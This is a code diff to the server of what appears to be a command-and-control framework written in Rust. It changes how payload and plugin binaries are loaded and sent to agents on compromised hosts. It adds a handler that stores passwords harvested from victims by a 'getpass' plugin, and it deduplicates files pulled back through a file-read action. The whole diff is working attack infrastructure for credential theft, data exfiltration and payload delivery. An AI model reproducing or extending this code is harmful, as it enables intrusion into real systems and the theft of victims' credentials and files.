@@ -21,6 +21,10 @@ use poem::{handler, get, post};
 use poem::http::StatusCode;
 use captcha_rs::CaptchaBuilder;
 
+fn is_safe(s: &str) -> bool {
+    !s.is_empty() && s.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-'))
+}
+
 #[handler]
 async fn npc_handler(
     Path((route,uri)): Path<(String,String)>, 
@@ -183,29 +187,55 @@ async fn npc_handler(
     }
 }
 
-
+ 
 async fn npc_event(
     proj:   models::projects::Model,
     agent:  protos::nps::Agent, 
     event:  protos::nps::AgentEvent, 
     app:    &core::AppState,
 ) -> anyhow::Result<()> {
-
     let _ = app.send_msg(event.clone()).await?;
 
     match event.enumof {
         Some(protos::nps::agent_event::Enumof::Plugin(req)) => { 
             match req.act.as_str(){
-                "ld" => { 
-                    let mut path = format!("{}.{}.{}.dat",req.name,agent.platform,agent.arch); 
-                    if !(path.contains("..") || path.contains("/")) {
-                        log::info!("{} LOAD PLUGIN {}", agent.id, path);
-                        let p = std::path::Path::new("./payloads").join(path);
-                        let mut data = Vec::new();
-                        if let Ok(mut file) = std::fs::File::open(p){
-                            let _ = file.read_to_end(&mut data)?;
-                        }
+                "ss" => {
+                    let plugin = protos::nps::Plugin{
+                        act: "ex".to_string(),
+                        .. req
+                    };
 
+                    let mut plevent = protos::nps::AgentEvent::default();
+                    plevent.id = event.sendto.clone();
+                    plevent.sendto = event.id.clone();
+                    plevent.enumof = Some(protos::nps::agent_event::Enumof::Plugin(plugin));
+                    app.add_event(plevent).await; 
+                },
+                "ld" => {         
+                    let mut plugin = protos::nps::Plugin{
+                        act: "ld".to_string(),
+                        .. req.clone()
+                    };
+
+                    if !req.arch.is_empty() && !is_safe(&req.arch) || !is_safe(&req.name) || !is_safe(&agent.platform) || !is_safe(&agent.arch) {
+                        log::debug!("{:?} {:?}",req,agent);
+                        return Ok(());
+                    }
+
+                    let mut data = Vec::new();
+                    let path = if req.arch.is_empty(){
+                        let path = format!("{}.{}.{}.dat",req.name,agent.platform,agent.arch); 
+                        std::path::Path::new("./payloads").join(path)
+                    }else{
+                        let path = format!("{}.{}.{}.{}",req.name,agent.platform,agent.arch,req.arch); 
+                        std::path::Path::new("./plugins").join(path)
+                    };
+                    log::info!("{} load {:?}", agent.id, path);
+                    let mut file = std::fs::File::open(path)?;
+                    let _ = file.read_to_end(&mut data)?;
+
+                    if req.name.as_str() == "npc2" {
+                        plugin.entry = "plugmain".to_string();
                         if let Ok(Some(listen)) = models::prelude::Listens::find_by_id(&proj.listen).one(&app.conn).await {
                             let mut dna     = protos::npc2::Config::default();
                             dna.id          = agent.id.clone(); //使得生成的hash不一致
@@ -228,36 +258,41 @@ async fn npc_event(
                                 }
                             }
                         }
-
-                        let plugin = protos::nps::Plugin{
-                            act: "ld".to_string(),
-                            name: req.name,
-                            args: req.args,
-                            data: data,
-                            .. Default::default()
-                        };
-                        let mut plevent = protos::nps::AgentEvent::default();
-                        plevent.id = event.sendto.clone();
-                        plevent.sendto = event.id.clone();
-                        plevent.enumof = Some(protos::nps::agent_event::Enumof::Plugin(plugin));
-
-                        app.add_event(plevent).await;
                     }
+
+                    plugin.data = data;
+
+                    let mut plevent = protos::nps::AgentEvent::default();
+                    plevent.id = event.sendto.clone();
+                    plevent.sendto = event.id.clone();
+                    plevent.enumof = Some(protos::nps::agent_event::Enumof::Plugin(plugin));
+
+                    app.add_event(plevent).await;
                 },
-                "ss" => {
-                    if req.name.as_str() == "npc2" {
-                        if let Ok(Some(listen)) = models::prelude::Listens::find_by_id(&proj.listen).one(&app.conn).await {
-                            let plugin = protos::nps::Plugin{
-                                act: "ex".to_string(),
-                                name: req.name,
-                                args: format!("{}/{}/{}",listen.onlineaddr,agent.id,listen.enckey),//key写死了
-                                .. Default::default()
-                            };
-                            let mut plevent = protos::nps::AgentEvent::default();
-                            plevent.id = event.sendto.clone();
-                            plevent.sendto = event.id.clone();
-                            plevent.enumof = Some(protos::nps::agent_event::Enumof::Plugin(plugin));
-                            app.add_event(plevent).await; 
+                "dd" => {
+                    if req.name.as_str() == "getpass" {
+                        let models: Vec<models::passresult::Model> = serde_json::from_slice(&req.data)?;
+                        for model in models {
+                            let existing = models::passresult::Entity::find()
+                                .filter(models::passresult::Column::Target.eq(&proj.id))
+                                .filter(models::passresult::Column::Username.eq(&model.username))
+                                .filter(models::passresult::Column::Password.eq(&model.password))
+                                .filter(models::passresult::Column::Passtype.eq(&model.passtype))
+                                .one(&app.conn)
+                                .await?;
+                            if !existing.is_some() {
+                                let mut active_model = models::passresult::ActiveModel{
+                                    id :        Set(utils::uuid()),
+                                    target:     Set(proj.id.clone()),
+                                    agent:      Set(format!("{}@{}",agent.username,agent.intranet)),
+                                    username:   Set(model.username),
+                                    password:   Set(model.password),
+                                    passtype:   Set(model.passtype),
+                                    passfrom:   Set(model.passfrom),
+                                    .. Default::default()
+                                };
+                                active_model.insert(&app.conn).await?;
+                            }
                         }
                     }
                 }
@@ -286,21 +321,32 @@ async fn npc_event(
                 },
                 "fr" => { //文件读取
                     let id = utils::uuid();
-                    let path = std::path::Path::new("./data").join(&id);
-                    let mut file = std::fs::File::create(path)?;
-                    file.write_all(&req.data)?;
-                
-                    let mut active_model = models::fileresult::ActiveModel{
-                            id :        Set(id),
-                            target:     Set(proj.id),
-                            agent:      Set(format!("{}@{}",agent.username,agent.intranet)),
-                            fileauth:   Set(utils::uuid()),
-                            filepath:   Set(req.path),
-                            filename:   Set(req.name),
-                            filesize:   Set(req.data.len() as i64),
-                            .. Default::default()
-                    };
-                    active_model.insert(&app.conn).await?;
+
+                    let existing = models::fileresult::Entity::find()
+                        .filter(models::fileresult::Column::Target.eq(&proj.id))
+                        .filter(models::fileresult::Column::Filepath.eq(&req.path))
+                        .filter(models::fileresult::Column::Filename.eq(&req.name))
+                        .filter(models::fileresult::Column::Filesize.eq(req.data.len() as i64))
+                        .one(&app.conn)
+                        .await?;
+
+                    if !existing.is_some() { // 不存在才写入
+                        let path = std::path::Path::new("./data").join(&id);
+                        let mut file = std::fs::File::create(path)?;
+                        file.write_all(&req.data)?;
+                        
+                        let mut active_model = models::fileresult::ActiveModel{
+                                id :        Set(id),
+                                target:     Set(proj.id),
+                                agent:      Set(format!("{}@{}",agent.username,agent.intranet)),
+                                fileauth:   Set(utils::uuid()),
+                                filepath:   Set(req.path),
+                                filename:   Set(req.name),
+                                filesize:   Set(req.data.len() as i64),
+                                .. Default::default()
+                        };
+                        active_model.insert(&app.conn).await?;
+                    }
                 },
                 _ => {}
             }
@@ -373,7 +419,6 @@ fn payload_download(strmod: u16) -> Vec<u8> {
         let _ = file.read_to_end(&mut buf);
     }
     
-
     buf
 }
 
